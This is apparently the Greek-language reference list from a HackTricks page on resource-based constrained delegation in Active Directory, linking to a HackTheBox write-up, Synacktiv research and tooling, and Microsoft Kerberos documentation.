- [8] [0xdf – HTB Bruno (LDAP signing απενεργοποιημένο → Kerberos relay προς RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Εξερευνώντας το cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Εξερευνώντας το cross-domain & cross-forest RBCD: μέρος 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Κλάδος Impacket της Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Επισκόπηση του Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Εντοπισμός και αντιμετώπιση της χρήσης RC4 στο Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Λεπτομέρειες του S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
